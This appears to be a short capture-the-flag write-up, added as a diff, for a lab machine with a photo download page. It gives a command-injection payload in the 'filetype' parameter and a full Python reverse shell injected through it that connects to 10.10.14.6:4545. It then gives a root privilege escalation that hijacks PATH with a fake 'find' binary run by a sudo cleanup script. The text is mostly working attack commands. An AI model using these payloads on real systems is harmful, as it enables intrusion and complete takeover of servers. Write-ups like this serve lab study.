@@ -1,0 +1,34 @@
+Credential are in the source code ....
+
+On the page who you can download photo you you have a command injection 
+on the download buton in the arg file type 
+
+EX :
+
+photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;id
+
+You see it beacause if you add a cmd, it's create a error
+
+Reverse Shell:
+
+photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4545));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+
+
+PrivEscqlation :
+
+You can see a script run as root with:
+
+sudo -l
+
+You can exploit this line :
+
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+
+By pass the /bin/bash in find, give the execution right to find and change 
+PATH
+
+echo "/bin/bash" > find
+chmod +x find
+sudo PATH=$PWD:$PATH  /opt/cleanup.sh
+
+Root !!!
